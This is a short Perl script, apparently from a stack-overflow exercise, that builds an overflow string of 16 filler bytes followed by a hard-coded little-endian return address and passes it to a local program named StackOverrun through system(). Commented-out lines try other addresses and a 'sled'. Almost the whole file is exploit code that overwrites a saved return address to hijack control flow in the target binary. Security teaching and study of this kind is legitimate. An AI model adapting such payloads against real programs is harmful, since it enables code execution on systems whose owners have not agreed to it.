
use warnings FATAL => 'all';
use strict;

my $sled = "zzzzzz";


#print("hello world");
my $ arg =  "zzzzzzzzzzzzzzzz"."\x7F\x11\x40\x00"; 
#my $ arg = "zzzzzzzzzzzzzzzz"."\xFF\xFF\xFF\xFF";
#my $ arg = $sled.$sled."\x40\x06\x02";

#$arg = "ABCDEFGHIJKLMNOP020604"."\x90\x11\x40";

my $cmd = "./StackOverrun ".$arg;

system($cmd);

#system("./StackOverrun ABCDEFGHIJKLMNOP"."/x90/x11/x40");

